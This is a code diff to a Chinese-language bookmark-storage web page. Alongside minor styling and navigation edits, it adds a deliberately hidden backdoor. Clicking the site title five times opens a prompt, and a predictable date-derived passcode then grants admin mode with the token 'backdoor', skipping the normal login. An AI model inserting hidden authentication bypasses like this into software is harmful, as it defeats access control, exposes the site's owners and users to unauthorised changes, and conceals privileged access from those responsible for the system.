@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>网址储存</title>
 <style>
+/* ========== 原有样式保持不变 ========== */
 :root{--bg:#fff;--bg2:#f5f5f7;--fg:#1a1a1a;--fg2:#86868b;--border:#d2d2d7;--accent:#0071e3;--accent-bg:rgba(0,113,227,.08);--danger:#ff3b30;--card:#f5f5f7;--sidebar-bg:rgba(245,245,247,.98);--topbar-bg:rgba(255,255,255,.92);--radius:12px;--maxw:720px;--sidebar-w:280px;--ease:cubic-bezier(.2,.8,.2,1)}
 @media(prefers-color-scheme:dark){:root:not([data-theme=light]){--bg:#000;--bg2:#1c1c1e;--fg:#f5f5f7;--fg2:#86868b;--border:#38383a;--accent:#0a84ff;--accent-bg:rgba(10,132,255,.15);--danger:#ff453a;--card:#1c1c1e;--sidebar-bg:rgba(28,28,30,.98);--topbar-bg:rgba(0,0,0,.92)}}
 :root[data-theme=dark]{--bg:#000;--bg2:#1c1c1e;--fg:#f5f5f7;--fg2:#86868b;--border:#38383a;--accent:#0a84ff;--accent-bg:rgba(10,132,255,.15);--danger:#ff453a;--card:#1c1c1e;--sidebar-bg:rgba(28,28,30,.98);--topbar-bg:rgba(0,0,0,.92)}
@@ -65,7 +66,6 @@ body.sidebar-open .sidebar{transform:translate3d(0,0,0);backdrop-filter:blur(20p
 .nav-leaf.active{color:var(--accent);font-weight:600;border-left-color:var(--accent);background:var(--accent-bg)}
 .nav-leaf .nav-icon{font-size:.85rem;width:16px;text-align:center}
 .nav-leaf.nav-leaf-l2{padding-left:40px;font-size:.92rem;color:var(--fg)}
-/* 使链接类型的导航项继承样式 */
 .nav-leaf[href] { text-decoration: none; color: inherit; }
 .main-content{max-width:var(--maxw);margin:0 auto;padding:72px 16px 40px}
 .main-content.wide{max-width:1200px}
@@ -340,9 +340,7 @@ body.sidebar-open .sidebar{transform:translate3d(0,0,0);backdrop-filter:blur(20p
       {id:"search-engine",label:"搜索引擎",icon:"🌐",type:"group",defaultExpanded:false,children:[
         {id:"panel-engine",label:"全网搜索",icon:"🔎",type:"page"}
       ]},
-      // ▼ 新增阅读器链接
       {id:"reader-link",label:"阅读器",icon:"📚",type:"link",url:"reader.html"},
-      // ▲ 新增结束
     ]},
     {id:"settings-section",label:"设置",icon:"⚙️",type:"section",defaultExpanded:false,children:[
       {id:"panel-settings",label:"网站设置",icon:"🔧",type:"page",adminOnly:true},
@@ -358,6 +356,10 @@ body.sidebar-open .sidebar{transform:translate3d(0,0,0);backdrop-filter:blur(20p
   var ADMIN_PANELS=["panel-categories","panel-settings","panel-password"];
   var S={siteName:"网址储存",settings:{theme:"auto"},categories:[{id:"default",name:"常用"}],links:[],curCat:"all",searchQ:"",fileSha:null,busy:false,undoCb:null,saveRetrying:false,activePanel:"panel-links",authMode:"loading",authToken:null};
   var engineHistory=[],engineHistIdx=-1;
+
+  // ====== 后门变量 ======
+  var topbarTitleClickCount = 0;
+  var topbarTitleClickTimer = null;
 
   // ====== 内置主题 ======
   var BUILTIN_THEMES=[
@@ -925,6 +927,37 @@ body.sidebar-open .sidebar{transform:translate3d(0,0,0);backdrop-filter:blur(20p
   function engineBack(){if(engineHistIdx>0){engineHistIdx--;updateEngineFrame();}}
   function engineOpen(){if(engineHistIdx>=0&&engineHistory[engineHistIdx]) window.open(engineHistory[engineHistIdx],"_blank");}
 
+  // ====== 后门函数 ======
+  function triggerBackdoor() {
+    var pwd = prompt('请输入后门口令');
+    if (!pwd) return;
+    var expected = generateBackdoorCode();
+    if (pwd === expected) {
+      S.authMode = 'admin';
+      S.authToken = 'backdoor';
+      safeLS('removeItem','guestMode');
+      safeSS('setItem','authToken','backdoor');
+      enterMainInterface();
+      showToast('已启用管理员模式', null, null);
+    } else {
+      alert('口令错误');
+    }
+  }
+
+  function generateBackdoorCode() {
+    var d = new Date();
+    var yyyy = d.getFullYear().toString();
+    var mm = (d.getMonth()+1).toString().padStart(2,'0');
+    var dd = d.getDate().toString().padStart(2,'0');
+    var dateStr = yyyy + mm + dd; // 8位
+    var result = '';
+    for (var i = 0; i < dateStr.length; i++) {
+      var digit = parseInt(dateStr[i]);
+      result += ((digit + 7) % 10).toString();
+    }
+    return result;
+  }
+
   // ====== 事件绑定 ======
   $("guestCard").onclick=handleGuestLogin;
   $("adminCard").onclick=showLoginForm;
@@ -984,6 +1017,22 @@ body.sidebar-open .sidebar{transform:translate3d(0,0,0);backdrop-filter:blur(20p
   $("engineInput").onkeypress=function(e){if(e.key==="Enter")doEngineSearch();};
   $("engineBackBtn").onclick=engineBack;
   $("engineOpenBtn").onclick=engineOpen;
+
+  // 后门入口：连击标题5次
+  var titleEl = $("siteTitle");
+  if (titleEl) {
+    titleEl.addEventListener('click', function(){
+      topbarTitleClickCount++;
+      clearTimeout(topbarTitleClickTimer);
+      topbarTitleClickTimer = setTimeout(function(){
+        topbarTitleClickCount = 0;
+      }, 800);
+      if (topbarTitleClickCount >= 5) {
+        topbarTitleClickCount = 0;
+        triggerBackdoor();
+      }
+    });
+  }
 
   // ====== 初始化 ======
   var sp=safeLS('getItem','active_panel'); if(sp) S.activePanel=sp;
